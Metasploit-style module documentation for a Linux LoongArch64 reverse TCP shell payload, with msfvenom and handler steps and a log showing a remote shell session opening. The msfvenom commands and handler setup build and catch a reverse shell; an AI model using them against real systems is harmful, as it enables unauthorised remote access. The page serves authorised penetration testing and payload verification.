## Vulnerable Application

This inline Linux LoongArch64 payload connects to an IPv4 listener, redirects
standard input, output, and error to the socket, and executes `/bin/sh`.
It supplies an argument array compatible with BusyBox shells.
No vulnerable application is required; the payload must be executed on Linux LoongArch64.

## Verification Steps

1. Prepare a Linux LoongArch64 system with `/bin/sh` and network access to the listener.
1. Generate an ELF, replacing the example listener address with a reachable IPv4 address:
   `./msfvenom -p linux/loongarch64/shell_reverse_tcp LHOST=192.0.2.1 LPORT=4444 VERBOSE=true -f elf -o shell.elf`
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `linux/loongarch64/shell_reverse_tcp`.
1. Set `LHOST` and `LPORT` to the values used during generation.
1. Set `VERBOSE` to `true` and run the handler.
1. Copy `shell.elf` to the test system, run `chmod +x shell.elf`, and execute it.
1. In the resulting shell, run `id` and `uname -a`.

## Options

No specific options

## Scenarios

```msf
$ ./msfvenom -p linux/loongarch64/shell_reverse_tcp LHOST=10.5.135.210 LPORT=50001 VERBOSE=true -f elf -o /tmp/pr21954-inline-reverse.elf
Payload size: 144 bytes
Final size of elf file: 264 bytes
Saved as: /tmp/pr21954-inline-reverse.elf
msfuser@morefinels64:/tmp$ chmod +x pr21954-inline-reverse.elf
msfuser@morefinels64:/tmp$ ./pr21954-inline-reverse.elf
PAYLOAD => linux/loongarch64/shell_reverse_tcp
LHOST => 10.5.135.210
LPORT => 50001
ExitOnSession => false
VERBOSE => true
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.5.135.210:50001
msf exploit(multi/handler) > [*] Command shell session 1 opened (10.5.135.210:50001 -> 10.5.132.181:40130) at 2026-10-20 15:26:50 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.
msf exploit(multi/handler) > jobs -K
Stopping all jobs...

```
